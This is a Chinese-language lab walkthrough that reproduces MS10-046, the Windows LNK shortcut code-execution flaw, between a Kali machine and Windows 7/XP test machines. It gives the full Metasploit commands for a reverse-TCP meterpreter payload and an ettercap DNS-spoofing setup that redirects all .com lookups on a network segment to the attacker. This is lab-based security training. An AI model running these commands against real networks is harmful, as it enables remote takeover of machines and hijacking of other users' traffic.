## MS10-046漏洞复现

### 一、**漏洞概述**

​	**Microsoft Windows快捷方式LNK文件自动执行代码漏洞。**

​	Windows支持使用快捷方式或LNK文件。LNK文件是指向本地文件的引用，点击LNK文件与点击快捷方式所制定的目标具有相同效果。Windows没有正确的处理LNK文件，特制的LNK文件可能导致Windows自动执行快捷方式文件所指定的代码。这些代码可能位于USB驱动、本地或远程文件系统、光驱或其他位置，使用资源管理器查看了LNK文件所在的位置就足以触发这个漏洞。

​	**受影响系统包括：Windows XP SP3/SP2、Vista SP2/SP1、Server**  **、2008 R2/SP2和Windows 7**。

### 二、开始实验

#### 1.实验环境

|   靶机   |     IP地址     |
| :------: | :------------: |
|   kali   | 192.168.88.133 |
| windows7 | 192.168.88.140 |

> kali和win7互相ping，确保两台机器处于同一网段下

![1726391707153](assets/1726391707153.png)

![1726391736372](assets/1726391736372.png)

#### 2.漏洞复现

```
2.1Kali中输入命令msfconsole进入MSF攻击框架。
```

![1726391879924](assets/1726391879924.png)

```
2.2配置监听模块
search ms10_046
use 0
set payload windows/meterpreter/reverse_tcp	#配置攻击载荷payload
set SRVHOST 192.168.88.133	#Kali的IP地址
set LHOST 192.168.88.133	#Kali的IP地址（反向连接地址）
show options	#查看配置信息
run	#开始攻击
```

![1726392046774](assets/1726392046774.png)

![1726392422350](assets/1726392422350.png)

![1726392810814](assets/1726392810814.png)

```
2.3配合使用ettercap进行DNS欺骗
cd /etc/ettercap
ls
vim etter.dns 
*com A 192.168.88.133 #将.com后缀的域名解析成kali的IP地址192.168.88.133。
```

![1726393592801](assets/1726393592801.png)

![1726393700188](assets/1726393700188.png)

```
2.4开启ettercap劫持整个网段
ettercap -T -q -i eth0 -P dns_spoof

说明：
-T 使用基于文本界面
-q 启动安静模式（不回显的意思）
-i 指定网卡
-P 使用插件，这里我们使用的是dns_spoof（DNS欺骗插件）。
//// 通常用于指定目标。如果不需要限定目标，//即可表示所有主机。
```

![1726401056753](assets/1726401056753.png)

![微信截图_20240915195425](assets/微信截图_20240915195425.png)

```
2.5Windows7已经弹出一个文件夹，其中有一个【.dll文件】和一个【快捷方式】，双击快捷方式，就可以获得windows7控制权。
这里漏洞利用失败了没有反弹shell但是有主机反馈信息，可能版本高的原因，换了windowsXP就可以了，步骤是一样的。
输入命令【sessions -1】进入到WindowsXP系统的【meterpreter】控制界面。
```

![1726405102484](assets/1726405102484.png)

![1726404464377](assets/1726404464377.png)

![1726405457455](assets/1726405457455.png)

